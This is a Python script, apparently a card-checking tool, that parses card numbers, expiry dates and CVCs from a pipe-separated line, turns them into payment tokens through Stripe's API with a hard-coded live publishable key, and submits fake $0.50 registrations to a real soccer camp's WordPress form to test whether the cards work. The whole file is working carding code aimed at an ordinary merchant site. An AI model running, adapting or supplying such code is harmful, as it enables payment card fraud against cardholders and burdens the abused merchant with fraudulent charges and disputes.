import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F9e39ef88d1%3B+stripe-js-v3%2F9e39ef88d1%3B+card-element&key=pk_live_51IhvFCI9vRapEwc0oXIdYrGiwfq9wTdgqsvJ8Y6rG6zr3WDU8r7MyCwhDjuANQZORPEdMovywEzImejpLijk3ATe00fIL9wUnU'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'chandellesoccer.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://chandellesoccer.com',
	    'referer': 'https://chandellesoccer.com/chandelle-soccer-camp-registration/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1746953645617',
	}
	
	data = f'data=__fluent_form_embded_post_id%3D10541%26_fluentform_10_fluentformnonce%3D310c97a01a%26_wp_http_referer%3D%252Fchandelle-soccer-camp-registration%252F%26Parent_name%3DRodam%2520User%26Email_Address%3Drodamuser07%2540gmail.com%26Phone_Number%3D43003000890%26Childs_Name%255B0%255D%255B%255D%3DRodam%2520User%26Childs_Name%255B0%255D%255B%255D%3D20%26Emergency_Contact_Name%3DRodam%2520User%26Phone_Number_1%3D4303000890%26Camp_selection%3DHalf%2520Day%2520Camp%26input_text%3DJune%25207%252C%25202025%2520(9%253A00%2520AM%2520%25E2%2580%2593%252012%253A00%2520PM)%26Location%3D1140%2520W%2520Alameda%2520Dr%2520Suite%25201%252C%2520Tempe%252C%2520AZ%252085282%26custom-payment-amount%3D0.50%26payment_method%3Dstripe%26__stripe_payment_method_id%3D{pm}&action=fluentform_submit&form_id=10'
	
	response = requests.post(
	    'https://chandellesoccer.com/wp-admin/admin-ajax.php',
	    params=params,
	    headers=headers,
	    data=data,
	)
	
	return (response.text)
